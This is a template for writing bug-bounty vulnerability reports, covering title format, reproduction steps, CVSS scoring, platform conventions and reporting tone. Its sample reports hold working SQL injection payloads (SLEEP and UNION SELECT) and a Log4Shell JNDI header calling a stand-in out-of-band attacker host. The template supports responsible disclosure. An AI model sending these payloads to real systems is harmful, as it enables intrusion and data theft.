# SRC report submission template

> Applies to: HackerOne, Bugcrowd, Butian, Vulbox, CNVD, private SRC programs
> Three-part structure: title / reproduction / impact — a reviewer can score it within 30 seconds

---

## 0. Pre-submission self-check, 10 items

Tick each one before pressing Submit:

- [ ] The title follows the `[severity][precondition][type] endpoint - one line` format
- [ ] The asset is in the program scope (check the policy page)
- [ ] The reproduction steps are numbered one by one, with full HTTP request/response
- [ ] At least 1 response screenshot + 1 screenshot with the URL visible
- [ ] Side-effect evidence (out-of-band / data / file / command output)
- [ ] At least 3 successful reproductions (5 for critical bugs)
- [ ] A CVSS 3.1 / 4.0 vector + the impacted segment
- [ ] Remediation advice (specific + actionable)
- [ ] No irreversible impact on production data
- [ ] Personal PII / third-party data is redacted

---

## 1. Title template

```
[severity][precondition][vulnerability type] endpoint - one-line description
```

Examples:

```
[Critical][Unauthenticated][RCE] /api/v1/import accepts ${jndi:} - one-request compromise
[High][Authenticated][SQLi] /api/search?q= UNION injection - reads the admin hash
[High][Broken access][IDOR] /api/orders/{id} horizontally walks others' orders
[Medium][CSRF] /api/email/change missing token + SameSite=None
[Critical][Default credentials] Spring Boot Actuator /heapdump - leaks the DB password
```

Platform mapping:

| Platform | Severity |
|------|------|
| HackerOne | None / Low / Medium / High / Critical (auto-converted from CVSS) |
| Bugcrowd | VRT P1 / P2 / P3 / P4 / P5 |
| Butian | Critical / High / Medium / Low |
| CNVD | Super-critical / High / Medium / Low |

---

## 2. The three-part body

### Section 1: Summary

```markdown
## Summary

**Type**: SQL injection (authenticated, time-based blind)
**Location**: the `keyword` parameter of `POST /api/search`
**Severity**: High
**CVSS 3.1**: 8.1 (`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`)
**Precondition**: a valid registered account (free registration)
**Scope of impact**: can dump the users table / read the admin password hash

One line: the `keyword` parameter of `POST /api/search` enters the SQL query without parameterization,
letting an attacker inject a SELECT statement to read arbitrary database content.
```

### Section 2: Steps to Reproduce

```markdown
## Steps to reproduce

### Environment
- Test time: 2025-05-09 14:30 UTC
- Test account: hunter_test01 (attacker-controlled)
- Target domain: target.com

### Step 1: log in to obtain a token

Request:

POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/json

{"email":"hunter+a@example.com","password":"<redacted>"}

Response:

{"token":"eyJhbGc... (first 12 chars)"}

### Step 2: trigger time-based blind injection (baseline comparison)

**True-condition request**:

POST /api/search HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbGc...
Content-Type: application/json

{"keyword":"x' AND (SELECT SLEEP(5))-- -"}

Response time: 5.21s

**False-condition request**:

POST /api/search HTTP/1.1
{"keyword":"x' AND (SELECT SLEEP(0))-- -"}

Response time: 0.08s

### Step 3: 5-run reproduction stability

| Run | True condition | False condition | Difference |
|-----|-------|-------|-----|
| 1 | 5.21s | 0.09s | 5.12s |
| 2 | 5.18s | 0.07s | 5.11s |
| 3 | 5.31s | 0.08s | 5.23s |
| 4 | 5.22s | 0.09s | 5.13s |
| 5 | 5.19s | 0.08s | 5.11s |

### Step 4: data exfiltration (version probe only, no database dump)

POST /api/search HTTP/1.1
{"keyword":"x' UNION SELECT 1,2,version()-- -"}

Response: [{"id":1,"name":2,"info":"5.7.34-log"}]

I did not attempt to dump table data / read the admin password hash / write files via outfile.
```

### Section 3: Impact + Remediation

```markdown
## Impact

- **Database version**: MySQL 5.7.34
- **Reachable scope**: all tables in the current database (prod_main)
- **Extractable data**: users, orders, payments tables (inferred to contain PII / financial data)
- **Escalation**: read /etc/passwd via LOAD_FILE (if the FILE privilege is present) → information disclosure
- **Business impact**: user privacy disclosure, compliance risk (GDPR / CCPA)

## Remediation advice

### Short term (immediate)
- Use a parameterized query for the `keyword` parameter at `/api/search` (PreparedStatement / `?` placeholders)
- Temporarily deploy a WAF rule to block common SQL keywords

### Medium term (within a week)
- Audit all SQL-concatenation code site-wide, switching uniformly to ORM / parameterization
- Enable query-log monitoring for anomalous SQL

### Long term
- Least-privilege database accounts (SELECT on a single table only)
- Introduce SQL-injection static scanning (integrated into CI)

## What I did not do

- Did not dump the real data of any table
- Did not attempt LOAD_FILE / OUTFILE
- Did not read the admin password hash
- Did not test injection on other endpoints

Further demonstration is available at your security team's request.
```

---

## 3. Attachment checklist

Each report should include 4-6 categories of material:

```
attachments/
├── 01-poc-screenshot.png         # vulnerability overview screenshot
├── 02-burp-flow.png               # Burp traffic screenshot
├── 03-recording.mp4               # 30s-2min recording (strongly recommended for P0/P1)
├── 04-poc.py                      # reproduction script (if any)
├── 05-dns-log.txt                 # OOB platform log (required for SSRF / RCE)
└── 06-cvss-calc.png               # CVSS calculator screenshot
```

---

## 4. CVSS quick-reference (pre-filled by vulnerability type)

```
Unauthenticated RCE          AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8
Authenticated RCE            AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H = 8.8
Unauthenticated SQLi (dump)  AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N = 9.1
Authenticated SQLi           AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N = 8.1
Unauth data export / IDOR    AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N = 7.5
Arbitrary file read          AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N = 7.5
Arbitrary file write → RCE   AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8
Unauth SSRF + metadata       AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8
JWT alg=none / forgery       AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8
Vertical priv-esc (to admin) AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H = 8.8
Horizontal broken access (IDOR) AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N = 6.5
Password-reset takeover      AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N = 9.1
Price tampering              AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N = 6.5
Stored XSS (admin panel)     AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N = 6.1
Reflected XSS                AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N = 6.1
Open redirect                AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N = 4.7
.git disclosure              AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N = 7.5
.env leaking prod credentials AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8
Default-credential admin panel AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8
HTTP smuggling               AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N = 9.0
Race-condition financial over-deduction AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N = 6.5
```

---

## 5. Format adjustments per platform

### HackerOne

- Use English titles (unless the program allows Chinese)
- Choose Severity: None / Low / Medium / High / Critical
- The Asset must be picked from the dropdown
- Upload the reproduction request via H1's attachments
- Triagers may not read Chinese → keep the key information bilingual

### Bugcrowd

- Use VRT classification (Server-Side Injection / Authentication / ...)
- VRT tiers P1-P5 map to bounty ranges
- Attachments supported + Markdown-friendly

### Butian / Vulbox

- Chinese is OK
- Choose the vulnerability type from the platform's dropdown
- General-type vs event-type; general-type goes through a CNVD/CNNVD id
- The reproduction PoC must be redacted

### CNVD

- General-type: vendor contact, scope of impact, reproducible PoC
- Event-type: URL, captured traffic, reproduction steps
- All real IPs / domains / data must be redacted

---

## 6. Report tone

DO:
- Objective, reproducible, quantifiable
- Proactively state "what I did not do"
- Give specific remediation advice ("add a PreparedStatement at line N")
- Leave contact info for retesting

DON'T:
- Threaten / demand compensation / go public / apply media pressure
- "Your company's security is terrible"
- "If you don't fix it I'll tweet"
- Cram multiple bugs into one report (submit each independent bug separately)

---

## 7. Follow-up process

```
Submit (Day 0)
  ↓
Triage (1-7 days): the reviewer decides "valid / needs more info / duplicate / rejected"
  ↓
Resolved (1-60 days): the developers fix it
  ↓
Bounty (after the fix or after triage)
  ↓
Disclosure (by default after 90 days, or with the vendor's agreement)
```

Closed-as-duplicate / insufficient information:

- Resend Burp's raw HTTP request as proof
- Provide a new IP / timestamp / different test account
- Do not resubmit repeatedly (ban risk)

Closed-as-N/A / Out of scope:

- Read the program policy carefully
- Appeal politely if warranted, with your reading of the scope attached
- Do not farm points

---

## 8. A complete skeleton (copy and adapt directly)

```markdown
# [Critical][Unauthenticated][RCE] /api/v1/import - one-request ${jndi:} compromise

## Summary
- Type: JNDI injection (Log4Shell class)
- Location: the X-Api-Version header of POST /api/v1/import
- Severity: Critical
- CVSS: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- Precondition: none (public endpoint)
- Impact: remote code execution, no authentication required

## Environment
- Test time: 2025-05-09 14:30 UTC
- Attacker OOB: abc.attacker-oob.cc (researcher-controlled)

## Steps to reproduce

### Step 1: send the injection payload

POST /api/v1/import HTTP/1.1
Host: target.com
X-Api-Version: ${jndi:dns://test.abc.attacker-oob.cc/a}

### Step 2: verify the OOB trigger

DNS log (attacker-oob.cc backend):
2025-05-09 14:30:42 UTC | source 3.x.x.x | query test.abc.attacker-oob.cc

The source IP 3.x.x.x reverse-resolves to target.com's egress IP.

### Step 3: 5-run reproduction stability
All succeeded, average trigger latency < 1s.

## Impact
1. Remote code execution (based on the classic Log4Shell chain)
2. Full server control
3. Can read /etc/passwd, config files, AWS metadata, etc.

## What I did not do
- Did not actually load a remote class / spawn a reverse shell
- Only proved the trigger via DNS out-of-band
- Did not read any config file

## Remediation advice
1. Immediately upgrade log4j-core to 2.17.1+
2. Set -Dlog4j2.formatMsgNoLookups=true
3. Deploy a WAF rule to block the ${jndi: pattern

## Attachments
- 01-burp-poc.png (request + response)
- 02-dns-log.png (OOB log)
- 03-recording.mp4 (2-minute recording)
```

---
